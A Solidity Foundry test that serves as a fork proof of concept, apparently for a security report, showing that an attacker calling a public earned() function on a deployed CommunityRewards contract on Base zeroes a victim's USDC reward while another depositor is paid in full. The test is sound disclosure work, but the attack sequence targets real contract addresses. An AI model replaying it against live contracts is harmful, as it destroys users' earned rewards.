// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";
import {CommunityRewards} from "../../src/CommunityRewards/CommunityRewards.sol";
import {ProtocolTimeLibrary} from "../../src/libraries/ProtocolTimeLibrary.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {Loan} from "../../src/LoanV2.sol";
import {IVotingEscrow} from "../../src/interfaces/IVotingEscrow.sol";

interface IUSDC {
    function balanceOf(address) external view returns (uint256);
    function mint(address, uint256) external;
    function configureMinter(address, uint256) external;
    function masterMinter() external view returns (address);
    function transfer(address, uint256) external returns (bool);
}

/// @notice FORK PoC (Base): reproduces the CommunityRewards.earned() reward-griefing against the REAL
///         wired contracts (deployed Loan proxy + real VotingEscrow + real USDC), mirroring the repo's
///         own passing testCommunityRewards setup. An attacker calling the public, state-mutating
///         earned(token, victim) zeroes the victim's claim while a control user is still paid in full.
contract CommunityRewardsEarnedGriefFork is Test {
    IUSDC usdc = IUSDC(0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913);
    Loan loan = Loan(0x87f18b377e625b62c708D5f6EA96EC193558EFD0);
    IVotingEscrow ve = IVotingEscrow(0xeBf418Fe2512e7E6bd9b87a8F0f294aCDC67e6B4);
    uint256 tokenId = 524;

    address victim = address(0x353641);
    address control = address(0x26546);
    address attacker = address(0xBADBEEF);

    CommunityRewards cr;

    function setUp() public {
        vm.createSelectFork(vm.envString("ETH_RPC_URL"));

        address[] memory tokens = new address[](1);
        tokens[0] = address(usdc);

        // upgrade the live Loan proxy to the in-scope LoanV2 implementation (as the repo test does)
        vm.startPrank(loan.owner());
        loan.upgradeToAndCall(address(new Loan()), new bytes(0));
        vm.stopPrank();

        // stand up a CommunityRewards over a real veNFT (same flow as test/CommunityRewards.t.sol)
        address holder = ve.ownerOf(tokenId);
        vm.prank(holder);
        ve.transferFrom(holder, address(this), tokenId);
        CommunityRewards impl = new CommunityRewards();
        ERC1967Proxy proxy = new ERC1967Proxy(address(impl), "");
        ve.approve(address(proxy), tokenId);
        vm.roll(block.number + 1);
        CommunityRewards(address(proxy)).initialize(address(loan), tokens, 2500e18, tokenId, address(ve));
        cr = CommunityRewards(address(proxy));

        vm.prank(usdc.masterMinter());
        usdc.configureMinter(address(this), type(uint256).max);
    }

    function _tokens() internal view returns (address[] memory t) {
        t = new address[](1);
        t[0] = address(usdc);
    }

    function test_fork_earnedGrief_zeroesVictim_controlUnaffected() public {
        // victim + control each deposit equal shares (as `authorized` == loan)
        vm.startPrank(address(loan));
        cr.deposit(tokenId, 1e18, victim);
        cr.deposit(tokenId, 1e18, control);
        vm.stopPrank();

        // one epoch later, fund + notify USDC rewards for the epoch
        vm.warp(block.timestamp + 7 days);
        usdc.mint(address(cr), 4e6);
        vm.prank(address(loan));
        cr.notifyRewardAmount(address(usdc), 4e6); // 2 depositors -> 2e6 each

        // L1: attacker calls the public, state-mutating earned() on the victim (no payout occurs)
        vm.prank(attacker);
        cr.earned(address(usdc), victim);

        // victim claims -> griefed to zero
        vm.prank(victim);
        cr.getReward(_tokens());
        uint256 victimGot = usdc.balanceOf(victim);

        // control claims -> unaffected, full share
        vm.prank(control);
        cr.getReward(_tokens());
        uint256 controlGot = usdc.balanceOf(control);

        console2.log("victim USDC received :", victimGot);
        console2.log("control USDC received:", controlGot);
        assertEq(victimGot, 0, "victim's reward was griefed to zero by a permissionless earned() call");
        assertGt(controlGot, 0, "control depositor still receives their reward");
    }
}
